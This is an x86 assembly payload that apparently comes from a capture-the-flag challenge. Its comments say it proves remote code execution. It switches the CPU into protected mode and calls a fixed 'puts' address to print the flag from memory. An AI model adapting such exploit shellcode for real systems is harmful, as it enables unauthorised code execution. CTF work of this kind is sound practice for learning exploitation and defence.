[bits 16]
[org 0x49c0]


; This proves we have rce
; Now it's the players job to read the flag from the disk
entry:
    nop
    cli

    mov ax, 0h
    mov ds, ax			; Set DS-register to cs 
    mov es, ax
    mov fs, ax
    mov gs, ax
    lgdt [7DA8h]
    mov eax, cr0
	or eax, 1               ; Set bit 0 
	mov cr0, eax
    db   0x66, 0xea      ; ljmpl opcode
    dd   0x90200+pm         ; offset
    dw   08h       ; segment	
    jmp $

[BITS 32]
pm:
    mov ax, 10h 			; Save data segment identifyer
	mov ds, ax 				; Setup data segment
	mov es, ax
	mov ss, ax				; Setup stack segment
	mov fs, ax
	mov gs, ax
    mov esp, 0x00f00000
    mov eax, 0x1348C ; pwn flag memory location
    push eax
    mov eax, 0x121B7 ;puts
    call eax
    jmp $

align 32
gdt:                            ; Address for the GDT

gdt_null:
	dd 0
	dd 0

;KERNEL_CODE equ $-gdt		; 0x08
gdt_kernel_code:
	dw 0FFFFh 	; Limit 0xFFFF
	dw 0		; Base 0:15
	db 0		; Base 16:23
	db 09Ah 	; Present, Ring 0, Code, Non-conforming, Readable

	db 0CFh		; Page-granular
	db 0 		; Base 24:31

;KERNEL_DATA equ $-gdt
gdt_kernel_data:                        
	dw 0FFFFh 	; Limit 0xFFFF
	dw 0		; Base 0:15
	db 0		; Base 16:23
	db 092h 	; Present, Ring 0, Code, Non-conforming, Readable
	db 0CFh		; Page-granular
	db 0 		; Base 24:31

gdt16_code:
    ; 16-bit 4gb flat r/w/executable code descriptor
    dw 0xFFFF                   ; limit low
    dw 0                        ; base low
    db 0                        ; base middle
    db 10011010b                ; access
    db 10001111b                ; granularity
    db 0                        ; base high

gdt16_data:
    ; 16-bit 4gb flat r/w data descriptor
    dw 0xFFFF                   ; limit low
    dw 0                        ; base low
    db 0                        ; base middle
    db 10010010b                ; access
    db 10001111b                ; granularity
    db 0                        ; base high

gdt_end:                        ; Used to calculate the size of the GDT

gdt_desc:                       ; The GDT descriptor
	dw gdt_end - gdt - 1    ; Limit (size)
	dd gdt                  ; Address of the GDT